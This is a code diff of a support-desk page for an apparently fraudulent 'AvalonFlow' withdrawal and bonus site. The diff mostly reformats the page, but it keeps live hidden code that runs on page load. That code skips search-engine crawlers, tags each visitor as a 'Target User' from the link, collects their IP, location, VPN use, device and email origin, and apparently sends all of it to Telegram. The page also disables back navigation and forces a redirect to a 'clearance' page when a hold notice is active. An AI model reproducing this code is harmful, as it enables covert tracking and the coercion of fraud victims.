@@ -300,20 +300,17 @@
 
 <style>
 /* ---------- Base ---------- */
-body {         font-family: 'Georgia', sans-serif;  margin: 0; background: #0d0d0d; color: #fff; overflow-x: hidden; }
+body { font-family: 'Georgia', sans-serif; margin: 0; background: #0d0d0d; color: #fff; overflow-x: hidden; }
 button { cursor: pointer; } 
 a { color: inherit; text-decoration: none; }
 
-        /* ---------- Floating Background ---------- */
+/* ---------- Floating Background ---------- */
 #floating-bg {
     position: fixed;
     inset: 0;
     z-index: 0;
     pointer-events: none;
-
-    /* Soft white/blue futuristic background */
     background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);
-
     overflow: hidden;
 }
 
@@ -321,10 +318,7 @@ a { color: inherit; text-decoration: none; }
     position: absolute;
     border-radius: 50%;
     opacity: 0.6;
-
     animation: floatParticles linear infinite;
-
-    /* Soft futuristic glow */
     background: rgba(120, 180, 255, 0.7);
     box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
 }
@@ -334,54 +328,45 @@ a { color: inherit; text-decoration: none; }
         transform: translateY(100vh) scale(0.3);
         opacity: 0;
     }
-
     50% {
         opacity: 1;
     }
-
     100% {
         transform: translateY(-10vh) scale(1);
         opacity: 0;
     }
 }
 
-                                                    /* ---------- Sidebar ---------- */
+/* ---------- Sidebar ---------- */
 #sidebar {
     position: fixed;
     top: 0;
     left: 0;
     width: 280px;
-
-    /* FIX 1: Make height end exactly before the footer starts */
     height: calc(100% - 102px); 
-
     background: rgba(40, 75, 135, 0.75);
-
     backdrop-filter: blur(14px);
-
-    /* FIX 2: Set z-index lower than footer (5) so footer naturally caps it */
     z-index: 5; 
-
     padding: 25px;
     transform: translateX(-100%);
     transition: transform 0.3s ease;
 }
-        #sidebar.open { transform: translateX(0); }
-        #sidebar h2{
-font-size:22px;
-margin-bottom:20px;
-color:#a78bfa;
+#sidebar.open { transform: translateX(0); }
+#sidebar h2 {
+    font-size: 22px;
+    margin-bottom: 20px;
+    color: #a78bfa;
 }
-        #sidebar button {
-            width: 100%;
-            margin: 12px 0;
-            padding: 12px;
-            border: none;
-            border-radius: 10px;
-            background: rgba(255,255,255,0.1);
-            color: #fff;
-            font-size: 16px;
-        }
+#sidebar button {
+    width: 100%;
+    margin: 12px 0;
+    padding: 12px;
+    border: none;
+    border-radius: 10px;
+    background: rgba(255,255,255,0.1);
+    color: #fff;
+    font-size: 16px;
+}
 
 /* ---------- Content ---------- */
 #content { position: relative; z-index: 1; padding: 40px; max-width: 1100px; margin: auto; padding-bottom: 120px; }
@@ -393,41 +378,36 @@ color:#a78bfa;
 .mini-tv { background: rgba(0,0,0,0.45); border-radius: 14px; padding: 18px; margin: 18px 0; border: 1px solid rgba(107,44,216,0.35); font-size: 15px; min-height: 60px; display: flex; align-items: center; }
 
 /* ---------- Buttons ---------- */
-.button { background: #6b2cd8; color: #fff; border: none; border-radius: 10px; padding: 12px 18px; margin-top: 12px; width: 100%; font-size: 16px; }
-.input { width: 100%; padding: 12px; border-radius: 10px; border: none; margin-top: 12px; background: rgba(255,255,255,0.15); color: #fff; }
+.button { background: #6b2cd8; color: #fff; border: none; border-radius: 10px; padding: 12px 18px; margin-top: 12px; width: 100%; font-size: 16px; transition: opacity 0.2s; }
+.button:hover { opacity: 0.9; }
+.input { width: 100%; padding: 12px; border-radius: 10px; border: none; margin-top: 12px; background: rgba(255,255,255,0.15); color: #fff; box-sizing: border-box; }
+.input::placeholder { color: rgba(255,255,255,0.7); }
 
-                                /* ---------- Menu Button ---------- */
-        #menuBtn {
-            position: fixed;
-            top: 20px;
-            left: 20px;
-            z-index: 6;
-            background: #6b2cd8;
-            border: none;
-            color: #fff;
-            padding: 12px 14px;
-            border-radius: 10px;
+/* ---------- Menu Button ---------- */
+#menuBtn {
+    position: fixed;
+    top: 20px;
+    left: 20px;
+    z-index: 6;
+    background: #6b2cd8;
+    border: none;
+    color: #fff;
+    padding: 12px 14px;
+    border-radius: 10px;
 }
 
-/* move button when sidebar opens */
-#menuBtn.shift{
-left:250px;
+#menuBtn.shift {
+    left: 250px;
 }
 
-  /* ================= Header Logo Card Neon ================= */
-
+/* ================= Header Logo Card Neon ================= */
 .minimal-logo-header {
   display: flex;
   justify-content: center;
   align-items: center;
-
-  /* Reduced top padding dramatically so it sits near the top edge */
   padding: 10px 0 10px 0; 
-
-  /* Optional: Ensures it stays firmly at the absolute top of the page layout */
   width: 100%;
   margin-top: -72px; 
-
   background: transparent !important;
 }
 
@@ -436,7 +416,7 @@ left:250px;
   width: 200px;
   height: 200px;
   overflow: hidden;
-  background: transparent !important; /* Kept perfectly transparent, no card background */
+  background: transparent !important;
 }
 
 .avalon-logo-img {
@@ -446,27 +426,17 @@ left:250px;
   width: 100%;
   height: 100%;
   object-fit: contain;
-
-  /* Keep your logo scaling */
   transform: scale(0.40);
   transform-origin: center center;
-
-  /* ---------- LOGO GLASS EFFECT ---------- */
-  /* This blurs the particles directly through the transparent logo asset itself */
   backdrop-filter: blur(4px);
   -webkit-backdrop-filter: blur(4px);
   opacity: 0.9; 
-  /* -------------------------------------- */
-
   filter: drop-shadow(0 4px 14px rgba(0, 0, 0, 0.05));
   mix-blend-mode: multiply; 
-  background:  transparent !important;
+  background: transparent !important;
   border: none !important;            
   outline: none !important;
 }
-
-/* ---------- Dark/Light Mode Toggle ---------- */
-#themeToggle { position: fixed; top: 20px; right: 20px; z-index: 6; padding: 10px 14px; border-radius:10px; background:#6b2cd8; color:#fff; border:none; cursor:pointer; }
 
 /* ---------- Footer ---------- */
 footer {
@@ -491,187 +461,19 @@ footer {
 @keyframes liquidWave { 0% { left: -50%; } 100% { left: 100%; } }
 
 /* ---------- Live Status Badge ---------- */
-.status-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 14px; border-radius: 20px; font-size: 14px; margin-bottom: 15px; }
+.status-badge { display: inline-flex; align-items: center; gap: 8px; padding: 8px 14px; border-radius: 20px; font-size: 14px; margin-bottom: 15px; background: rgba(0,0,0,0.2); }
 .status-dot { width: 10px; height: 10px; border-radius: 50%; background: #00ff6a; box-shadow: 0 0 10px #00ff6a; }
 .status-offline { background: #ccc; box-shadow: 0 0 5px #ccc; }
-
-/* ---------- Kairos Bot (Full UI System) ---------- */
-
-#assistantBotCard {
-  width: 100%;
-  max-width: 400px;
-  margin-top: 20px;
-  padding: 18px;
-  z-index: 1;
-
-  background: rgba(20, 20, 35, 0.6);
-  border-radius: 16px;
-  box-shadow: 0 10px 30px rgba(0,0,0,0.25);
-  backdrop-filter: blur(14px);
-  border: 1px solid rgba(255,255,255,0.08);
-}
-
-#botHeader {
-  background: linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9));
-  color: #fff;
-  text-align: center;
-  padding: 10px;
-  font-weight: 600;
-  letter-spacing: 0.4px;
-  border-radius: 12px 12px 0 0;
-}
-
-#botMessagesContainer {
-  height: 180px;
-  overflow-y: auto;
-  background: rgba(255,255,255,0.04);
-  backdrop-filter: blur(12px);
-  padding: 10px;
-  border-radius: 0 0 12px 12px;
-}
-
-/* Messages */
-.message {
-  animation: fadeSlideIn 0.25s ease forwards;
-  opacity: 0;
-  font-size: 13px;
-  padding: 6px 10px;
-  display: inline-block;
-  max-width: 85%;
-}
-
-.bot {
-  text-align: left;
-  color: #c7c7ff;
-  background: rgba(107,44,216,0.12);
-  border-radius: 10px 10px 10px 4px;
-}
-
-.user {
-  text-align: right;
-  color: #fff;
-  background: rgba(155,89,182,0.3);
-  border-radius: 10px 10px 4px 10px;
-}
-
-/* Wrap */
-.msgWrap {
-  display: flex;
-  flex-direction: column;
-  margin-bottom: 6px;
-}
-
-/* Animation */
-@keyframes fadeSlideIn {
-  from { opacity: 0; transform: translateY(6px); }
-  to { opacity: 1; transform: translateY(0); }
-}
-
-/* Typing dots */
-.typing {
-  display: inline-flex;
-  gap: 4px;
-  background: rgba(107,44,216,0.12);
-  padding: 6px 10px;
-  border-radius: 10px 10px 10px 4px;
-}
-
-.typing span {
-  width: 6px;
-  height: 6px;
-  background: #c7c7ff;
-  border-radius: 50%;
-  animation: blink 1.2s infinite;
-}
-
-.typing span:nth-child(2) { animation-delay: 0.2s; }
-.typing span:nth-child(3) { animation-delay: 0.4s; }
-
-@keyframes blink {
-  0%, 80%, 100% { opacity: 0.2; }
-  40% { opacity: 1; }
-}
-
-/* Meta (time + ticks) */
-.meta {
-  display: flex;
-  justify-content: flex-end;
-  align-items: center;
-  gap: 4px;
-  margin-top: 2px;
-}
-
-.timestamp {
-  font-size: 10px;
-  opacity: 0.5;
-  color: #aaa;
-}
-
-/* Double ticks */
-.tick {
-  font-size: 11px;
-  letter-spacing: -2px;
-}
-
-.tick.delivered::after {
-  content: "✓✓";
-  color: #bbb;
-}
-
-.tick.seen::after {
-  content: "✓✓";
-  color: #6c8cff;
-}
-
-/* Ambient */
-.ambient {
-  text-align: center;
-  color: #aaa;
-  font-size: 12px;
-  opacity: 0.8;
-}
-
-/* Input */
-#botInput {
-  flex: 1;
-  padding: 8px;
-  border: none;
-  border-radius: 10px;
-  background: rgba(255,255,255,0.08);
-  color: #fff;
-  margin-right: 4px;
-  outline: none;
-}
-
-/* Button */
-#botSendBtn {
-  background: linear-gradient(135deg, rgba(107,44,216,0.9), rgba(155,89,182,0.9));
-  border: none;
-  color: #fff;
-  border-radius: 10px;
-  padding: 8px 12px;
-  cursor: pointer;
-}
-
-/* ---------- Dark/Light Mode ---------- */
-body.light-mode { background: #f5f5f5; color: #111; }
-body.light-mode #sidebar { background: rgba(120, 180, 255, 0.7); color: #111; }
-body.light-mode .glass-card { background: rgba(120, 180, 255, 0.7); color: #111; }
-body.light-mode .button { background: #6b2cd8; color: #fff; }
-body.light-mode .notification-bar { background: rgba(30,144,255,0.25); color: #111; border-color: rgba(30,144,255,0.4); }
 
 #ticketFile {
     background: rgba(255,255,255,0.1);
     border-radius: 10px;
-    padding: 6px;
+    padding: 8px;
     color: #fff;
     width: 100%;
-}
-#analyticsPanel div {
-    background: rgba(107,44,216,0.15);
-    padding: 6px 12px;
-    border-radius: 8px;
-    font-size: 14px;
+    box-sizing: border-box;
+    margin-top: 12px;
+    border: 1px dashed rgba(255,255,255,0.3);
 }
 
 .badge-item {
@@ -690,28 +492,25 @@ body.light-mode .notification-bar { background: rgba(30,144,255,0.25); color: #1
 <body>
 
 <div id="floating-bg"></div>
-    <button id="menuBtn" onclick="toggleSidebar()">☰
-
-<div style="position: absolute; top: 54px; left: 50%; transform: translateX(-50%); white-space: nowrap; pointer-events: none; text-align: center;">
+<button id="menuBtn" onclick="toggleSidebar()">☰
+    <div style="position: absolute; top: 54px; left: 50%; transform: translateX(-50%); white-space: nowrap; pointer-events: none; text-align: center;">
         <span id="sidebarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Sidebar</span>
     </div>
 </button>
 
 <div id="supportNotification" class="notification-bar"></div>
 
-<button id="menuBtn" onclick="toggleSidebar()">☰</button>
-
-    <div id="sidebar">
-       <h2>AvalonFlow</h2>
+<div id="sidebar">
+    <h2>AvalonFlow</h2>
     <button onclick="window.location.href='/dashboard'">Dashboard</button>
-<button onclick="window.location.href='/notifications'">My Notifications</button>
+    <button onclick="window.location.href='/notifications'">My Notifications</button>
     <button onclick="window.location.href='/withdrawal'">Withdrawal</button>
     <button onclick="window.location.href='/myreturns'">Retention Bonus</button>
     <button onclick="window.location.href='/support'">Support</button>
     <button onclick="logout()">Logout</button>
 </div>
 
-  <header class="minimal-logo-header">
+<header class="minimal-logo-header">
   <div class="logo-shimmer-wrapper">
     <img src="assets/pictures/1780995787737.jpeg" alt="Avalon Logo" class="avalon-logo-img">
   </div>
@@ -724,48 +523,55 @@ body.light-mode .notification-bar { background: rgba(30,144,255,0.25); color: #1
             <span id="statusDot" class="status-dot"></span>
             <span id="statusText">Checking status...</span>
         </div>
-        <p><strong>Behind every smooth interaction is a dedicated team member. 👩‍💼💻</strong></p>
-        <div class="mini-tv" id="miniTV"></div>
+        <h2 style="margin: 0 0 10px 0; font-size: 24px; color: #fff;">Customer Care & Assistance Desk</h2>
+        <p style="margin-top: 0; color: #e0e0e0;"><strong>Behind every smooth interaction is a dedicated team member. 👩‍💼💻</strong></p>
         
-        <button class="button" onclick="generateTicket()">Generate Ticket Reference</button>
-        <p id="ticketResult" style="margin-top:15px;font-weight:bold;"></p>
-        <!-- Email Support Button -->
-<a href="mailto: avalonflow@usa.com" 
-   class="button" 
-   style="margin-bottom:20px;" 
-   onclick="notify('Include your ticket reference in the email.')">
-   Email Support
-</a>
+        <div class="mini-tv" id="miniTV"></div>
 
-<!-- Issue Category Dropdown -->
-<select id="issueCategory" 
-        class="input" 
-        style="margin-top:20px;">
-    <option value="">Select Issue Category</option>
-    <option value="technical">Technical</option>
-    <option value="billing">Billing</option>
-    <option value="account">Account</option>
-    <option value="other">Other</option>
-</select>
+        <!-- Issue Category Dropdown -->
+        <select id="issueCategory" class="input">
+            <option value="">Select Issue Category</option>
+            <option value="technical">Technical Support</option>
+            <option value="billing">Billing & Payouts</option>
+            <option value="account">Account Security & Access</option>
+            <option value="other">General Inquiry</option>
+        </select>
+
+        <!-- Issue Description Input -->
+        <input type="text" id="issueInput" class="input" placeholder="Briefly describe your issue (optional)...">
+
+        <!-- Optional File Attachment -->
+        <input type="file" id="ticketFile" onchange="handleFileSelect(event)">
+
+        <button class="button" onclick="generateTicket()">Generate Ticket Reference</button>
+        <p id="ticketResult" style="margin-top:15px; font-weight:bold; color: #a78bfa; word-break: break-all;"></p>
+        
+        <!-- Email Support Button -->
+        <a href="mailto:avalonflow@usa.com" 
+           class="button" 
+           style="display: block; text-align: center; box-sizing: border-box; text-decoration: none; margin-top: 15px;" 
+           onclick="notify('Include your ticket reference in the email.')">
+           📧 Email Support Desk
+        </a>
     </div>
 
     <!-- Gamification Panel -->
-    <div class="glass-card" id="gamificationPanel" style="margin-top:20px;">
-        <h3>🏆 Your Engagement</h3>
-        <div style="display:flex; gap:12px; flex-wrap: wrap; margin-bottom:12px;" id="badgesContainer">
+    <div class="glass-card" id="gamificationPanel" style="margin-top:25px;">
+        <h3 style="margin-top: 0;">🏆 Your Engagement & Rewards</h3>
+        <div style="display:flex; gap:12px; flex-wrap: wrap; margin-bottom:15px;" id="badgesContainer">
             <!-- Badges will appear here dynamically -->
         </div>
 
-        <div style="margin-bottom:12px;">
-            <strong>🔥 Streak:</strong> <span id="streakCount">0</span> days
+        <div>
+            <strong>🔥 Streak:</strong> <span id="streakCount">0</span> days active
         </div>
     </div>
-
+</div>
 
 <!-- Sticky Footer -->
-    <footer>
-       © 2026 AvalonFlow Corp • All Rights Reserved
-    </footer>
+<footer>
+   © 2026 AvalonFlow Corp • All Rights Reserved
+</footer>
 
 <script>
 // ==========================================
@@ -780,27 +586,21 @@ async function sendVisitorDetailsToTelegram() {
 
     const rawAgent = navigator.userAgent;
 
-    // Anti-Bot Filter: Silently drop execution if the visitor is a search engine or chat crawler
     if (/bot|googlebot|crawler|spider|robot|crawling|facebookexternalhit|slurp|embed/i.test(rawAgent)) {
-      console.log("🤖 Automated link indexing crawler bypassed safely.");
       return;
     }
 
-    // Target Identification: Extract tracking user from URL parameters
     const urlParams = new URLSearchParams(window.location.search);
     const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
 
-    // Failure Handling: Fetch network data strictly, throw error if down
     const ipResponse = await fetch('https://ipapi.co/json/');
     if (!ipResponse.ok) throw new Error('Failed to fetch network details');
     const ipData = await ipResponse.json();
 
-    // Capture device environment metrics safely
     const currentPage = window.location.pathname;
     let detailedDevice = "Unknown Device";
     let detectedBrowser = "Unknown Browser";
 
-    // 1. Upgraded Smart Browser Extractor (Ordered by Specificity)
     if (/WhatsApp/i.test(rawAgent)) {
       detectedBrowser = "WhatsApp In-App";
     } else if (/TelegramBot|Telegram/i.test(rawAgent)) {
@@ -831,7 +631,6 @@ async function sendVisitorDetailsToTelegram() {
       detectedBrowser = "Apple Safari";
     }
 
-    // Email Inbox Origin Identification (Fallback Check)
     const referrer = document.referrer || "";
     if (detectedBrowser === "Google Chrome" || detectedBrowser === "Apple Safari") {
       if (/mail\.google\.com/i.test(referrer)) {
@@ -843,7 +642,6 @@ async function sendVisitorDetailsToTelegram() {
       }
     }
 
-    // 2. Smart Device & OS Version Detection Engine
     if (/Android/i.test(rawAgent)) {
       const match = rawAgent.match(/Android\s+([^;]+);\s+([^)]+)/);
       if (match) {
@@ -870,7 +668,6 @@ async function sendVisitorDetailsToTelegram() {
       detailedDevice = "Linux System";
     }
 
-    // Anti-VPN Verification Check
     const isProxy = ipData.proxy || false;
     const ipDisplay = isProxy ? `${ipData.ip} ⚠️ [Proxy/VPN]` : ipData.ip;
 
@@ -887,7 +684,6 @@ async function sendVisitorDetailsToTelegram() {
       timestamp: new Date().toLocaleString()
     };
 
-    // HTML Parsing Engine: Final Golden Standard Output
     const messageText = `⚡ <b>New Visitor Alert | AvalonFlow</b>\n\n` +
                         `👤 <b>Target User:</b> <code>${identifyUser}</code>\n` +
                         `📄 <b>Visited Page:</b> <code>${currentPage}</code>\n` +
@@ -911,25 +707,22 @@ async function sendVisitorDetailsToTelegram() {
     });
 
     sessionStorage.setItem('visitor_logged_tg', 'true');
-    console.log("🔒 Security telemetry parameters forwarded successfully.");
   } catch (err) {
     console.warn("Telegram telemetry bypass error:", err);
   }
 }
 
-// --- THE PAGE LOAD TRIGGER ---
 document.addEventListener('DOMContentLoaded', () => {
   sendVisitorDetailsToTelegram();
+  updateEngagementUI();
 });
 
 // ==========================================
-// 🔔 LIGHTWEIGHT TAB & BADGE WATCHER (Sub-pages)
+// 🔔 LIGHTWEIGHT TAB & BADGE WATCHER
 // ==========================================
+const CLEARANCE_REDIRECT_URL = "clearance.html"; 
+const ENABLE_SUBPAGE_HOLD_REDIRECT = true;     
 
-const CLEARANCE_REDIRECT_URL = "clearance.html"; // Same target clearance page
-const ENABLE_SUBPAGE_HOLD_REDIRECT = true;     // Set true to redirect automatically on sub-pages when hold hits
-
-// Set static title string instead of pulling from document.title
 const originalDocumentTitle = "Notifications";
 let titleInterval = null;
 
@@ -943,7 +736,7 @@ function stopTitleFlashing() {
 function startTitleFlashing(count) {
     stopTitleFlashing();
     if (!document.hidden || count === 0) return;
-    
+
     let toggle = false;
     titleInterval = setInterval(() => {
         document.title = toggle ? `🔔 (${count}) New Notification!` : `(${count}) ${originalDocumentTitle}`;
@@ -975,13 +768,12 @@ function getFallbackActiveIds() {
 function checkUnreadNotifications() {
     const deletedIds = JSON.parse(localStorage.getItem('av_deleted_notifs') || '[]');
     const readIds = JSON.parse(localStorage.getItem('av_read_notifs') || '[]');
-    
+
     const rawCache = localStorage.getItem('av_active_notifs_cache');
     const activeNotifications = rawCache ? JSON.parse(rawCache) : getFallbackActiveIds();
-    
-    // Check if Stage 3 (#10) is active and unread
+
     const isHoldActiveAndUnread = activeNotifications.some(n => n.id === 10) && !readIds.includes(10) && !deletedIds.includes(10);
-    
+
     if (ENABLE_SUBPAGE_HOLD_REDIRECT && isHoldActiveAndUnread) {
         window.location.replace(CLEARANCE_REDIRECT_URL);
         return;
@@ -1019,24 +811,18 @@ document.addEventListener("visibilitychange", () => {
 });
 
 window.addEventListener("focus", checkUnreadNotifications);
-
 checkUnreadNotifications();
 
+history.pushState(null, null, location.href);
+window.addEventListener('popstate', function () {
+    history.go(1); 
+});
 
-
-  // Prevent user from going back to previous pages
-  history.pushState(null, null, location.href);
-
-  window.addEventListener('popstate', function () {
-    history.go(1); // keeps user on this page
-  });
-
-  // Optional: also prevent back with keyboard shortcuts
-  window.addEventListener('keydown', function (e) {
+window.addEventListener('keydown', function (e) {
     if ((e.key === 'Backspace' && e.target === document.body) || e.key === 'ArrowLeft') {
       e.preventDefault();
     }
-  });
+});
 
 /* Floating particles */
 const bg = document.getElementById('floating-bg');
@@ -1044,27 +830,20 @@ const bg = document.getElementById('floating-bg');
 function particle() {
     const p = document.createElement('div');
     p.className = 'particle';
-    
+
     const s = Math.random() * 20 + 10;
     p.style.width = s + 'px';
     p.style.height = s + 'px';
     p.style.left = Math.random() * 100 + 'vw';
     p.style.animationDuration = (Math.random() * 20 + 10) + 's';
-    
+
     bg.appendChild(p);
-    
     setTimeout(() => p.remove(), 30000);
 }
 
 setInterval(particle, 800);
 
-
-                        /* Sidebar toggle */
-        const sidebar = document.getElementById('sidebar');
-const content = document.getElementById('content');
-
-const menuBtn = document.getElementById('menuBtn');
-
+/* Sidebar toggle */
 function toggleSidebar() {
     const sidebar = document.getElementById('sidebar');
     const menuBtn = document.getElementById('menuBtn');
@@ -1078,17 +857,31 @@ function navigateTo(page){
 }
 
 // ---------- Notification ----------
-function notify(msg){ const n=document.getElementById('supportNotification'); n.textContent=msg; n.classList.add('show'); setTimeout(()=>n.classList.remove('show'),3000); }
+function notify(msg){ 
+    const n = document.getElementById('supportNotification'); 
+    n.textContent = msg; 
+    n.classList.add('show'); 
+    setTimeout(() => n.classList.remove('show'), 3000); 
+}
+
+// ---------- File upload handler ----------
+let uploadedFileName = null;
+function handleFileSelect(event) {
+    const file = event.target.files[0];
+    if (file) {
+        uploadedFileName = file.name;
+        notify(`Attached: ${uploadedFileName}`);
+    }
+}
 
 // ---------- Ticket System ----------
 let lastTicket = '';
+const issueCounts = {};
 
 function recordTicketGenerated() {
     let tickets = parseInt(localStorage.getItem("ticketsGenerated") || 0);
     tickets += 1;
     localStorage.setItem("ticketsGenerated", tickets);
-
-    // Update badges immediately
     updateEngagementUI();
 }
 
@@ -1097,28 +890,20 @@ function generateTicket() {
     const rand = Math.random().toString(36).substring(2, 6).toUpperCase();
     lastTicket = `AF-SUP-${stamp}-${rand}`;
 
-    // Show ticket reference
     let ticketText = `Ticket Reference: ${lastTicket}`;
-
-    // Include uploaded file if exists
     if (uploadedFileName) {
         ticketText += ` | Attached: ${uploadedFileName}`;
-        uploadedFileName = null; // reset after ticket generation
+        uploadedFileName = null; 
     }
 
     document.getElementById('ticketResult').textContent = ticketText;
-
-    // Notify the user
     notify('Ticket reference generated.');
 
-    // --- Analytics Update ---
     const inputEl = document.getElementById('issueInput');
     const input = inputEl ? inputEl.value || 'Miscellaneous' : 'Miscellaneous';
     if (issueCounts[input]) issueCounts[input] += 1;
     else issueCounts[input] = 1;
-    renderAnalytics();
 
-    // --- Gamification: record ticket generation ---
     recordTicketGenerated();
 }
 
@@ -1130,29 +915,37 @@ const tvMessages = [
     {type:'tip', text:"Our support desk is standing by."}
 ];
 let tvIndex=0;
-function rotateTV(){ const msg=tvMessages[tvIndex]; const tv=document.getElementById('miniTV'); tv.textContent=msg.text; tv.dataset.type=msg.type; tvIndex=(tvIndex+1)%tvMessages.length; }
-rotateTV(); setInterval(rotateTV,4000);
+function rotateTV(){ 
+    const msg = tvMessages[tvIndex]; 
+    const tv = document.getElementById('miniTV'); 
+    if(tv) { 
+        tv.textContent = msg.text; 
+        tv.dataset.type = msg.type; 
+    } 
+    tvIndex = (tvIndex + 1) % tvMessages.length; 
+}
+rotateTV(); 
+setInterval(rotateTV, 4000);
 
 // ---------- Live Status ----------
 function updateStatus(){
-    const now=new Date(); const estHour=(now.getUTCHours()-5+24)%24; const estDay=now.getUTCDay(); const isOffice=(estDay>=1 && estDay<=7) && (estHour>=9 && estHour<18);
-    const dot=document.getElementById('statusDot'); const text=document.getElementById('statusText');
-    if(isOffice){ dot.className='status-dot'; text.textContent='Support Desk Online'; }
-    else { dot.className='status-dot status-offline'; text.textContent='Support Desk Offline'; }
+    const now = new Date(); 
+    const estHour = (now.getUTCHours() - 5 + 24) % 24; 
+    const estDay = now.getUTCDay(); 
+    const isOffice = (estDay >= 1 && estDay <= 7) && (estHour >= 9 && estHour < 18);
+    const dot = document.getElementById('statusDot'); 
+    const text = document.getElementById('statusText');
+    if(!dot || !text) return;
+    if(isOffice){ 
+        dot.className = 'status-dot'; 
+        text.textContent = 'Support Desk Online'; 
+    } else { 
+        dot.className = 'status-dot status-offline'; 
+        text.textContent = 'Support Desk Offline'; 
+    }
 }
-updateStatus(); setInterval(updateStatus,60000);
-
-
-
-
-
-
-
-
-
-
-
-
+updateStatus(); 
+setInterval(updateStatus, 60000);
 
 function logout(){
     localStorage.removeItem("avalon_logged_in");
@@ -1160,53 +953,53 @@ function logout(){
     window.location.replace('https://membership.avalonflow.site/signin');
 }
 
-
-
-
-
+function addBadge(text) {
+    const container = document.getElementById("badgesContainer");
+    if(container) {
+        const span = document.createElement("span");
+        span.className = "badge-item";
+        span.innerText = text;
+        container.appendChild(span);
+    }
+}
 
 // ---------- Update Engagement UI ----------
 function updateEngagementUI() {
     const badgesContainer = document.getElementById("badgesContainer");
+    if(!badgesContainer) return;
 
-    // Clear old badges
     badgesContainer.innerHTML = "";
 
-    // Tickets and chats
     const tickets = parseInt(localStorage.getItem("ticketsGenerated") || 0);
-    const chats = parseInt(localStorage.getItem("messagesSent") || 0);
 
     if (tickets >= 1) addBadge("🎫 First Ticket");
     if (tickets >= 5) addBadge("🎟️ Ticket Master");
-    
 
-    // Update streak — simple version: store last visit date
     const today = new Date().toDateString();
     const lastVisit = localStorage.getItem("lastVisit");
     let streak = parseInt(localStorage.getItem("streak") || 0);
 
     if (lastVisit === today) {
-        // already counted today
+        // already counted
     } else {
         if(lastVisit === new Date(Date.now() - 86400000).toDateString()){
-            streak += 1; // consecutive day
+            streak += 1; 
         } else {
-            streak = 1; // reset streak
+            streak = 1; 
         }
         localStorage.setItem("streak", streak);
         localStorage.setItem("lastVisit", today);
     }
 
-    document.getElementById("streakCount").innerText = streak;
+    const streakEl = document.getElementById("streakCount");
+    if(streakEl) streakEl.innerText = streak;
 }
 
-/* ---------- Welcome ---------- */
-
 window.onload = () => {
-
-notify('Get assistance or clarification here.');
-
+    notify('Get assistance or clarification here.');
 };
+
+
 
 
 
